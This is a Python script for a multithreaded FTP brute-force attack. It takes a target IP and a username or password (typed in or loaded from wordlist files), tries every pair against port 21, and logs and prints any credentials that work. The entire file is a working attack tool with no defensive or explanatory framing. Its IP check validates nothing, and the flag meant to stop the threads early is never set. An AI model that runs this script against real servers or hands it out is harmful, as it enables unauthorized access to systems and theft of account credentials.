import os
import threading
import timeit
import logging
from ftplib import FTP
import signal
import getpass


# Set up Ctrl+C signal handler
def signal_handler(signal, frame):
    exit_program()


# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)


def exit_program():
    print("\nExiting program...")
    os._exit(0)


print("""
  __ _         
 / _| |_ _ __  
| |_| __| '_ \ 
|  _| |_| |_) |
|_|  \__| .__/ 
        |_|    
""")

found_credentials = False


# Check if the user input is in IP address format
def get_ip(target_input):
    try:
        return target_input
    except ValueError:
        return None


# Get the user input for username
def get_username(user_input):
    while True:
        if user_input == "U":
            return [input("Enter username: ")]
        elif user_input == "L":
            file_path = input("Enter the file path: ")
            file_path = rf"{file_path}"
            if os.path.isfile(file_path):
                print(f"The file path is: {file_path}")
                with open(file_path, 'r', encoding='utf-8-sig') as f:
                    lines = f.readlines()
                    user_list = [line.strip() for line in lines]
                return user_list
            else:
                print('The file does not exist')
        else:
            print('Invalid choice. Please enter U or L.')
            user_input = input("Enter U for a specific user or L for a list of users: ")


# Get the user input for password
def get_password_list(pass_input):
    while True:
        if pass_input == "P":
            return [getpass.getpass("Enter password: ")]
        elif pass_input == "L":
            file_path = input("Enter the file path: ")
            file_path = rf"{file_path}"
            if os.path.isfile(file_path):
                print(f"The file path is: {file_path}")
                with open(file_path, 'r', encoding='utf-8-sig') as f:
                    lines = f.readlines()
                    password_list = [line.strip() for line in lines]
                return password_list
            else:
                print('The file does not exist')
        else:
            print('Invalid choice. Please enter P or L.')
            pass_input = input("Enter P for a specific password or L for a list of passwords: ")


# Perform FTP brute force
def ftp_brute(ip, port, username_input, password_input):
    found_login = False  # Flag variable to track successful login

    for username in username_input:
        if found_login:  # Check if successful login found
            break

        for password in password_input:
            try:
                ftp = FTP()
                ftp.connect(ip, port)
                ftp.login(username, password)
                logging.info(f'Successful login - username: {username}, password: {password}')
                print(f'Successful login - username: {username}, password: {password}')
                ftp.quit()
                found_login = True  # Set flag to True if successful login found
                break
            except Exception as e:
                logging.warning(f'Authentication failed - username: {username}, password: {password}')
                print(f'Authentication failed - username: {username}, password: {password}')

        if found_login:  # Check if successful login found
            break  # Break out of outer loop when successful login found

    return found_login


def main():
    logging.basicConfig(filename='brute_force.log', level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    while True:
        target_choice = input("Enter the IP target: ")
        if get_ip(target_choice) is None:
            print("Invalid IP address")
        else:
            break

    while True:
        user_choice = input("Enter U for a specific user or L for a list of users: ")
        username_input = get_username(user_choice)
        if username_input is not None:
            break

    while True:
        pass_choice = input("Enter P for a specific password or L for a list of passwords: ")
        password_input = get_password_list(pass_choice)
        if password_input is not None:
            break

    port = 21  # default FTP port

    start_time = timeit.default_timer()  # start timer

    threads = []
    max_threads = 10  # Maximum number of concurrent threads

    # Perform brute force
    for username in username_input:
        if found_credentials:  # Check if successful login found
            break

        for password in password_input:
            if found_credentials:  # Check if successful login found
                break

            if len(threads) >= max_threads:
                # Wait for the threads to finish if the maximum number of threads is reached
                for thread in threads:
                    thread.join()
                threads = []

            thread = threading.Thread(target=ftp_brute, args=(target_choice, port, [username], [password]))
            thread.start()
            threads.append(thread)

    # Wait for any remaining threads to finish
    for thread in threads:
        thread.join()

    # Calculate elapsed time
    elapsed_time = timeit.default_timer() - start_time

    if not found_credentials:
        print("Brute force completed. No valid credentials found.")
    print(f"Elapsed time: {elapsed_time:.2f} seconds")


if __name__ == "__main__":
    main()

